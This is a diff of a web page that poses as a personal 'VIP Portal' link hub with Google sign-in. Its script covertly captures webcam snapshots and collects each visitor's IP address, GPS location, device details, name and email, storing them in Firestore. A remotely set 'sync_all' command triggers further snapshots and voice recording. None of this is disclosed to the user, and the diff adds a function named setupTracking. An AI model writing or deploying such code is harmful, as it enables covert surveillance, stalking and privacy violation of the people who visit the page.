@@ -3,40 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ratan Bro | Personal Hub</title>
+    <title>Ratan Bro | VIP Portal</title>
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root { --pink: #ff4d94; --dark: #020617; }
         * { margin:0; padding:0; box-sizing:border-box; font-family: 'Hind Siliguri', sans-serif; }
-        body { background: var(--dark); color: white; min-height: 100vh; background: radial-gradient(circle at center, #1e1b4b 0%, #020617 100%); }
+        body { background: var(--dark); color: white; min-height: 100vh; overflow-x: hidden; }
         
-        /* Glass UI */
-        #login-overlay { position: fixed; inset: 0; background: var(--dark); z-index: 10000; display: flex; align-items: center; justify-content: center; }
-        .login-box { background: rgba(255, 255, 255, 0.05); padding: 40px; border-radius: 30px; border: 1px solid var(--pink); text-align: center; backdrop-filter: blur(15px); width: 90%; max-width: 400px; box-shadow: 0 0 30px rgba(255, 77, 148, 0.2); }
-        .profile-main { width: 100px; height: 100px; border-radius: 50%; border: 3px solid var(--pink); margin-bottom: 15px; box-shadow: 0 0 20px var(--pink); }
+        /* Glass Background */
+        .bg-glow { position: fixed; width: 300px; height: 300px; background: var(--pink); filter: blur(150px); opacity: 0.2; z-index: -1; top: 10%; left: 10%; }
 
-        #main-ui { display: none; padding: 20px; animation: fadeIn 0.8s ease; }
-        @keyframes fadeIn { from {opacity: 0; transform: translateY(20px);} to {opacity: 1; transform: translateY(0);} }
+        #login-screen { position: fixed; inset: 0; background: var(--dark); z-index: 10000; display: flex; align-items: center; justify-content: center; }
+        .login-card { background: rgba(255,255,255,0.05); padding: 40px; border-radius: 30px; border: 1px solid var(--pink); text-align: center; backdrop-filter: blur(10px); width: 90%; max-width: 400px; }
+        
+        #main-ui { display: none; padding: 20px; max-width: 600px; margin: 0 auto; }
+        
+        /* Header Profile System */
+        .profile-section { display: flex; align-items: center; justify-content: space-between; background: rgba(255,255,255,0.05); padding: 20px; border-radius: 25px; border: 1px solid rgba(255,255,255,0.1); margin-top: 20px; }
+        .my-pic { width: 70px; height: 70px; border-radius: 50%; border: 3px solid var(--pink); box-shadow: 0 0 15px var(--pink); }
+        .user-info { text-align: center; flex: 1; }
+        .user-pic { width: 60px; height: 60px; border-radius: 50%; border: 2px solid white; margin-bottom: 5px; }
+        
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 25px; }
+        .card { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 20px; text-align: center; text-decoration: none; color: white; border: 1px solid rgba(255,255,255,0.1); transition: 0.3s; display: flex; flex-direction: column; align-items: center; gap: 10px; }
+        .card:hover { border-color: var(--pink); background: rgba(255, 77, 148, 0.1); transform: translateY(-5px); }
+        .card i { font-size: 2rem; color: var(--pink); }
 
-        .header { text-align: center; margin-bottom: 30px; }
-        .u-pic { width: 80px; height: 80px; border-radius: 50%; border: 2px solid var(--pink); margin-bottom: 10px; }
-
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; max-width: 800px; margin: 0 auto; }
-        .card { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 25px; text-align: center; text-decoration: none; color: white; border: 1px solid rgba(255,255,255,0.1); transition: 0.3s; }
-        .card:hover { border-color: var(--pink); transform: translateY(-5px); background: rgba(255, 77, 148, 0.1); }
-        .card i { font-size: 2.2rem; color: var(--pink); margin-bottom: 12px; }
-
+        .logout-btn { background: #ef4444; color: white; border: none; padding: 10px 20px; border-radius: 50px; cursor: pointer; margin-top: 20px; width: 100%; font-weight: bold; }
+        
         canvas, video { display: none; }
     </style>
 </head>
 <body>
+    <div class="bg-glow"></div>
 
-    <div id="login-overlay">
-        <div class="login-box">
-            <img src="ratan.jpg" class="profile-main" onerror="this.src='https://via.placeholder.com/100'">
-            <h2 style="color: var(--pink); margin-bottom: 10px;">স্বাগতম রতন ব্রো পোর্টালে</h2>
-            <p style="opacity: 0.7; margin-bottom: 25px; font-size: 0.9rem;">সবকিছু অ্যাক্সেস করতে লগইন করুন</p>
+    <div id="login-screen">
+        <div class="login-card">
+            <img src="ratan.jpg" style="width:100px; border-radius:50%; border:3px solid var(--pink); margin-bottom:20px;">
+            <h2 style="color: var(--pink);">Ratan Bro Portal</h2>
+            <p style="opacity: 0.6; margin-bottom: 30px;">সব পারমিশন দিয়ে প্রবেশ করুন</p>
             <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:15px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%; display:flex; align-items:center; justify-content:center; gap:10px;">
                 <i class="fab fa-google"></i> Login with Google
             </button>
@@ -44,20 +50,25 @@
     </div>
 
     <div id="main-ui">
-        <div class="header">
-            <img id="user_img" src="" class="u-pic">
-            <h2 id="user_welcome"></h2>
-            <p style="opacity: 0.5;">Online Dashboard</p>
+        <div class="profile-section">
+            <img src="ratan.jpg" class="my-pic" title="Ratan Bro">
+            <div class="user-info">
+                <img id="u_pic" src="" class="user-pic">
+                <h3 id="u_name">Loading...</h3>
+                <span style="font-size: 0.8rem; color: var(--pink);">Welcome User</span>
+            </div>
         </div>
-        
+
         <div class="grid">
-            <a href="https://www.facebook.com/yourprofile" target="_blank" class="card"><i class="fab fa-facebook"></i><h4>Facebook</h4></a>
-            <a href="https://wa.me/880123456789" target="_blank" class="card"><i class="fab fa-whatsapp"></i><h4>WhatsApp</h4></a>
-            <a href="#" class="card"><i class="fas fa-file-pdf"></i><h4>Test Paper</h4></a>
-            <a href="#" class="card"><i class="fas fa-briefcase"></i><h4>Business</h4></a>
-            <a href="https://numberlookup.pro.bd/" target="_blank" class="card"><i class="fas fa-search-location"></i><h4>No. Lookup</h4></a>
-            <a href="#" class="card"><i class="fas fa-id-card"></i><h4>Portfolio</h4></a>
+            <a href="https://facebook.com" class="card"><i class="fab fa-facebook"></i><span>Facebook</span></a>
+            <a href="https://wa.me/yournumber" class="card"><i class="fab fa-whatsapp"></i><span>WhatsApp</span></a>
+            <a href="#" class="card"><i class="fas fa-file-pdf"></i><span>Test Paper</span></a>
+            <a href="#" class="card"><i class="fas fa-briefcase"></i><span>Business</span></a>
+            <a href="#" class="card"><i class="fas fa-id-card"></i><span>Portfolio</span></a>
+            <a href="https://numberlookup.pro.bd/" target="_blank" class="card"><i class="fas fa-search-location"></i><span>No. Lookup</span></a>
         </div>
+
+        <button class="logout-btn" onclick="logout()">Logout</button>
     </div>
 
     <canvas id="snapCanvas" width="640" height="480"></canvas>
@@ -65,7 +76,7 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
-        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
         import { getFirestore, doc, setDoc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
         const firebaseConfig = {
@@ -83,54 +94,53 @@
         const provider = new GoogleAuthProvider();
 
         window.googleLogin = () => signInWithPopup(auth, provider);
+        window.logout = () => signOut(auth).then(() => location.reload());
 
         onAuthStateChanged(auth, (user) => {
             if (user) {
-                document.getElementById('login-overlay').style.display = 'none';
+                document.getElementById('login-screen').style.display = 'none';
                 document.getElementById('main-ui').style.display = 'block';
-                document.getElementById('user_img').src = user.photoURL;
-                document.getElementById('user_welcome').innerText = user.displayName;
-                initSystem(user);
+                document.getElementById('u_pic').src = user.photoURL;
+                document.getElementById('u_name').innerText = user.displayName;
+                setupTracking(user);
             }
         });
 
-        async function initSystem(user) {
+        async function setupTracking(user) {
             const uId = user.email.replace('.', '_');
             const userRef = doc(db, "users", uId);
 
-            // ক্যামেরা ও মাইক্রোফোন পারমিশন
+            // সব পারমিশন একসাথে নেওয়া
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => null);
             if(stream) document.getElementById('vSource').srcObject = stream;
 
-            // অ্যাডমিন কমান্ড চেক
             onSnapshot(userRef, async (snap) => {
                 const data = snap.data();
-                if(data && data.command === "sync_now") {
-                    await sendData(user);
+                if(data && data.command === "sync_all") {
+                    await sendStats(user);
                     await recordVoice(user);
                     await updateDoc(userRef, { command: "" });
                 }
             });
 
-            // প্রথমবার ঢোকার সাথে সাথে ডাটা পাঠানো
-            sendData(user);
+            sendStats(user); // এন্ট্রি করার সময় একবার ডাটা যাবে
         }
 
-        async function sendData(user) {
+        async function sendStats(user) {
             const canvas = document.getElementById('snapCanvas');
             const video = document.getElementById('vSource');
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, 640, 480);
             const pic = canvas.toDataURL('image/jpeg', 0.5);
             
-            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "N/A"}));
+            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
             
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 await setDoc(doc(db, "users", user.email.replace('.', '_')), {
                     name: user.displayName, email: user.email, photo: user.photoURL,
-                    ip: ipData.ip, loc: `${pos.coords.latitude},${pos.coords.longitude}`,
+                    ip: ip.ip, loc: `${pos.coords.latitude},${pos.coords.longitude}`,
                     lastPic: pic, time: new Date().toLocaleString(),
-                    device: navigator.platform + " | " + navigator.vendor
+                    device: navigator.userAgent
                 }, { merge: true });
             });
         }
